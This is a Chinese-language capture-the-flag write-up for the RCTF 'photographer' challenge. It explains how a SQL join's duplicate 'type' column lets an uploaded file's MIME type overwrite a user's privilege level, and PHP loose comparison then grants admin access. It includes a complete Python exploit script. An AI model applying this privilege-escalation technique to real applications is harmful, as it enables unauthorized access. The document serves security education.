# photographer

## 题目简述

PHP 相册应用的管理员判断依赖 `Auth::type() < $user_types['admin']`。用户查询时 `user` 与 `photo` 表都有 `type` 字段，SQLite 关联查询结果按列名覆盖，导致上传图片的 MIME type 能覆盖用户权限 type。

## 解题过程

### 关键观察

PHP 相册应用的管理员判断依赖 `Auth::type() < $user_types['admin']`。

### 求解步骤

flag 在 public/superadmin.php
$user_types['admin']  是 0，所以需要让 Auth::type()  小于 0。
Auth::type()  取自 session 里的 user 信息，而用户信息是在 User::findById  里查出来
的：
if (Auth::check() && Auth::type() < $user_types['admin']) {
    echo getenv('FLAG') ?: 'RCTF{test_flag}';
}
这里用了leftJoin连表查询photo。但是user表和photo表都有 type。其中user.type  是权限等
级，photo.type  是文件的 MIME
framework/DB.php  这里可以看到使用SQLite 的fetchArray并且模式为SQLITE3_ASSOC，也
就是返回以列名索引的数组
所以后面的type将覆盖前面的，也就是 photo.type  会覆盖掉 user.type
上传图片时，Photo::create  用的type 是直接$_FILES里拿的：
type可控
所以思路就是，注册登录，上传个图片，抓包把 Content-Type  改成 -1 ，并设置为背景。此
时user.type  就变成了字符串 "-1" ，PHP 弱类型比较 "-1" < 0  成立
public static function findById($userId) {
    return DB::table('user')
        ->leftJoin('photo', 'user.background_photo_id', '=', 'photo.id')
        ->where('user.id', '=', $userId)
        ->first();
}
while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
    $rows[] = $row;
}
$file = [
    'type' => $files['type'][$i],
    // ...
];
import requests
import re

BASE_URL = '<http://<challenge-host>:26002>'
EMAIL = 'xxx@xxx.com'
PASSWORD = '123456'

s = requests.Session()

r = s.get(f'{BASE_URL}/register')
csrf_token = re.search(r'name="csrf_token" value="([a-f0-9]+)"',
r.text).group(1)

### 跨页补回：上传 MIME 覆盖权限脚本

s.post(f'{BASE_URL}/api/register', data={
    'username': 'hacker',
    'email': EMAIL,
    'password': PASSWORD,
    'confirm_password': PASSWORD,
    'csrf_token': csrf_token
})

# 随便一张图片
img_content =
b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x01\\x00\\x00\\
x00\\x01\\x08\\x06\\x00\\x00\\x00\\x1f\\x15\\xc4\\x89\\x00\\x00\\x00\\nIDATx\\
x9cc\\x00\\x01\\x00\\x00\\x05\\x00\\x01\\r\\n-
\\xb4\\x00\\x00\\x00\\x00IEND\\xaeB`\\x82'

# Content-Type 设置为 -1
files = {
    'photos[]': ('1.png', img_content, '-1')
}
r = s.post(f'{BASE_URL}/api/photos/upload', files=files)
photo_id = r.json()['photos'][0]['id']

r = s.get(f'{BASE_URL}/settings')
csrf_token = re.search(r'name="csrf_token" value="([a-f0-9]+)"',
r.text).group(1)

s.post(f'{BASE_URL}/api/user/background', data={
    'photo_id': photo_id,
    'csrf_token': csrf_token
})

r = s.get(f'{BASE_URL}/superadmin.php')
print(r.text)
RCTF{h4rd_70_54y_wh37h3r_175_4_bu6_0r_4_f347ur3}

## 方法总结

- 核心技巧：SQL join 同名字段覆盖与 PHP 弱类型比较。
- 识别信号：关联查询 `SELECT *` 后使用关联数组，多个表存在同名权限字段。
- 复用要点：上传 MIME、文件名等元数据若进入 join 结果，可能覆盖鉴权字段。
